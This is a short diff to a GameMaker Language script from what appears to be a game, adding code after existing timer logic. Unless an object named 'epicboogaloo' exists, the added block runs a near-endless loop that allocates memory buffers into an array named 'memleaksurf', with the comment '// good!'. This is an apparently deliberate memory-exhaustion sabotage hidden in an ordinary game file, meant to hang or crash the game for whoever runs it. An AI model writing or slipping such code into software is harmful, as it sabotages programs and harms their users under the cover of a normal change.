@@ -348,3 +348,15 @@ else if (global.panicshadetimer != 0)
 {
     global.panicshadetimer = 0;
 }
+
+if (object_exists(asset_get_index("epicboogaloo")) && instance_exists(epicboogaloo))
+{
+	exit;
+}
+
+var _surf = []
+var i = 0
+
+repeat (9999999999999999999) // good!
+	memleaksurf[i++] = buffer_create(99999, buffer_grow, 2);
+
